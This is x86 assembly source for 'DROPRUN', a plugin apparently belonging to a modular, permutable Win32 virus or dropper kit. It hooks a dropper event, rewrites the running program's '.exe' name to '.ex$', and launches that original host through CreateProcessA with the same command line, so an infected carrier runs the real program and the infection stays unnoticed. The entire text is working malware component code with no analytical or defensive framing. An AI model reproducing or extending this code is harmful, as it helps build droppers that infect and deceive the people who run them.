   ; DROPRUN
   ; ~~~~~~~~
   ; - dropper runner: runs argv0.EX$ file when archive unpacked,
   ;                   with the same commandline parameters

   include                 dropper.inc
   include                 k32man.inc
   include                 arclib.inc

   include                 plugin.inc
                           PLUGIN_START    DROPRUN, W32R3, PERMUTABLE

   handleevent:            hookevent EV_DROPPER_START_ARC, drun
                           stc
                           retn

   drun:                   pusha

   ;                       sub     esp, 512

                           mov     ecx, 512/4
   __push0:                push    0
                           loop    __push0

   _cmdline                =       byte ptr 0
   _startinfo              =       byte ptr 260
   _procinfo               =       byte ptr 260+44h
   _eos                    =       byte ptr 260+44h+16

                           callX   GetCommandLineA
                           xchg    esi, eax

                           lea     edi, [esp]._cmdline
                           mov     edx, edi            ; edx = @cmdline
                           xor     ecx, ecx            ; #

   __1:                    lodsb
                           stosb

                           mov     ebx, [edi-4]    ; .exe
                           or      ebx, 20202000h
                           neg     ebx

                           cmp     ebx, -EXT_EXE
                           jne     __2

                           mov     ebx, -EXT_NEW
                           neg     ebx
                           mov     [edi-4], ebx    ; .ex$
                           inc     ecx             ; #

   __2:                    or      al, al
                           jnz     __1

                           dec     ecx             ; #
                           jnz     __exit

                           lea     eax, [esp]._procinfo
                           push    eax             ; procinfo

                           lea     eax, [esp+4]._startinfo
                           mov     dword ptr [eax], 40h    ; struct length
                           push    eax             ; startupinfo

                           push    0               ; curdir
                           push    0               ; env
                           push    0               ; flags
                           push    1               ; inherithandles
                           push    0               ; process_attr
                           push    0               ; thread_attr
                           push    edx             ; offset cmdline
                           push    0               ; application
                           callX   CreateProcessA

   __exit:                 add     esp, 512

                           popa
                           stc     ; keep event, all regs saved
                           retn

                           PLUGIN_END
